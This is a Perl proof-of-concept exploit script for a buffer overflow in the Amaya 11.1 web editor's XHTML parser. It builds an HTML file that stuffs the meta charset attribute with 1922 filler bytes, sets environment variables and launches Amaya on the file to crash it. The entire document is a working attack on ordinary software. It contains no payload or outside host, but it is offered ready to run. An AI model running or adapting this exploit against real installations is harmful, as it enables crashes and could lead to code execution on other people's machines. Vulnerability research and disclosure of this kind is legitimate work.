#!/usr/bin/perl -w

# [*] Amaya 11.1 XHTML Parser Buffer Overflow POC
# [*] C1c4Tr1Z <c1c4tr1z@voodoo-labs.org>
## Copyright (c) 2008-2009 Voodoo Research Group.

my $filename="b0f.html";
my $b0f="\x41"x1922;
my $vulnerable=qq{
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset={b0f}">
</head>

<body>
</body>
</html>
};
#debug: "gdb -q --args \"/usr/lib/Amaya/wx/bin/amaya_bin\" ./$filename"
my $exec="/usr/lib/Amaya/wx/bin/amaya_bin ./$filename";

open(HTML, "> $filename") || die "[-] Error ($!). Exiting..\n";
$vulnerable=~s|(\{b0f\})+|$b0f|g;
print HTML $vulnerable;
close(HTML);

print "[+] File $filename created.\n";
print "[+] Setting enviroment variables..\n";

$ENV{'XLIB_SKIP_ARGB_VISUALS'}=1;
$ENV{'G_SLICE'}="always-malloc";

print "[+] Executing amaya\n";
sleep(3);
exec("clear; $exec");
